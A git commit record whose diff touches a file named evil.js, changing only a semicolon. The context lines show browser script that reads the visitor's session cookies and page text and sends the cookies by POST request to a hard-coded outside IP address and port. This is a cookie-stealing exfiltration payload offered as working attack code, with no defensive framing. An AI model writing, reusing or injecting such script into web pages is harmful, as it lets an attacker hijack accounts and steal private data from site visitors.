ae2190af39a5f196e6def124027b140a41545e04
LeCrepuscule <143530654+tac-eL@users.noreply.github.com>
2024-10-29 09:31:41 +0800

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,7 +1,7 @@
 const cookie = document.cookie;
 const textContent = document.body.innerText;
 const targetServer = "http://139.224.199.99:9999/";
-const target = targetServer + "cookie?" + cookie
+const target = targetServer + "cookie?" + cookie;
 
 fetch(target, {
     method: 'POST',
